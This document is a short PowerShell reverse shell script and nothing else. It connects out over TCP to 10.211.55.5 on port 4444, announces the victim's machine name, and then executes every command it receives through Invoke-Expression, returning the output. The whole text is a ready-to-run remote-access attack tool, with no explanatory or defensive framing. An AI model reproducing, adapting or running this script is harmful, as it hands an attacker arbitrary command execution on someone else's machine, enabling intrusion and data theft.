
$c = '10.211.55.5'; $p = 4444;
$client = New-Object System.Net.Sockets.TCPClient($c, $p);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$buffer = New-Object byte[] 1024;
$encoding = New-Object System.Text.ASCIIEncoding;

$writer.WriteLine("Connection Established: " + [System.Environment]::MachineName);
$writer.Flush();
While($client.Connected) {
    $stream.Read($buffer, 0, $buffer.Length) | Out-Null;
    $data = $encoding.GetString($buffer);
If($data.Trim() -ne "") {
        $output = Invoke-Expression $data 2>&1 | Out-String;
        $writer.WriteLine($output);
        $writer.Flush();
    }
}
